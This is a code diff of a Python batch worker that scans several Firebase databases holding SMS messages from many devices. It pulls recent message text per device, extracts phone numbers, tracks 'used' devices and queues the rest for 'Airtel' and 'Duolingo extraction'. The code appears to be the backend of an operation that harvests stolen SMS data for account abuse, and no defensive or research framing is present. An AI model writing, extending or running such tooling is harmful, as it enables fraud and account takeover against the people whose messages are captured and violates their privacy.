@@ -4093,36 +4093,58 @@ async def airtel_batch_worker(concurrency: int = 2, delay: float = 8.0):
             with open(AIRTEL_USED_FILE, "r") as f:
                 used_devices = {l.strip() for l in f if l.strip()}
 
-        # Scan devices from all Firebase DBs
+        # Scan devices — same as Gemini: shallow messages scan + phone from SMS text
         await emit_log("[Airtel] Scanning Firebase for devices...", "info")
         device_map = {}
         for db in firebase_dbs:
-            fb_url = clean_firebase_url((db.get("url") or "").strip())
-            if not fb_url:
+            fb_url_base = clean_firebase_url((db.get("url") or "").strip())
+            if not fb_url_base:
                 continue
+            db_name = fb_url_base.split("//")[1].split(".")[0] if "//" in fb_url_base else fb_url_base
             try:
+                # Step 1: Get all device IDs via shallow query (fast)
                 async with state.http_session.get(
-                    fb_url_with_auth(fb_url, "clients.json"), timeout=30
+                    fb_url_with_auth(fb_url_base, "messages.json", "shallow=true"), timeout=30
                 ) as resp:
                     if resp.status != 200:
                         continue
-                    clients = await resp.json()
-                    if not isinstance(clients, dict):
-                        continue
-                    for dev_id, dev_data in clients.items():
-                        if dev_id in used_devices:
-                            continue
-                        phone_raw = ""
-                        if isinstance(dev_data, dict):
-                            phone_raw = (dev_data.get("phone") or dev_data.get("number")
-                                         or dev_data.get("mobile") or "")
-                        if not phone_raw:
-                            continue
-                        phone_clean = str(phone_raw).strip().lstrip("+").lstrip("91")
-                        if len(phone_clean) == 10:
-                            device_map[dev_id] = {"phone": phone_clean, "url": fb_url}
+                    shallow = await resp.json()
+                if not isinstance(shallow, dict):
+                    continue
+
+                all_device_ids = set(shallow.keys()) - used_devices
+                await emit_log(f"[Airtel] {db_name}: {len(all_device_ids)} devices", "info")
+
+                # Step 2: For each device get last 5 messages, extract phone
+                sem = asyncio.Semaphore(20)
+                async def scan_device(dev_id):
+                    async with sem:
+                        try:
+                            query_url = fb_url_with_auth(
+                                fb_url_base, f"messages/{dev_id}.json",
+                                "orderBy=\"$key\"&limitToLast=5"
+                            )
+                            async with state.http_session.get(query_url, timeout=10) as r:
+                                if r.status != 200:
+                                    return
+                                msgs = await r.json()
+                            if not isinstance(msgs, dict):
+                                return
+                            for msg_data in msgs.values():
+                                if not isinstance(msg_data, dict):
+                                    continue
+                                text = msg_data.get("message", "") or msg_data.get("body", "") or str(msg_data)
+                                phone = extract_phone_from_text(text)
+                                if phone:
+                                    device_map[dev_id] = {"phone": phone, "url": fb_url_base}
+                                    return
+                        except Exception:
+                            pass
+
+                await asyncio.gather(*[scan_device(did) for did in all_device_ids])
+
             except Exception as e:
-                await emit_log(f"[Airtel] Scan error for {fb_url}: {e}", "warn")
+                await emit_log(f"[Airtel] Scan error {db_name}: {e}", "warn")
 
         available = list(device_map.keys())
         await emit_log(f"[Airtel] {len(available)} devices available for Duolingo extraction", "info")
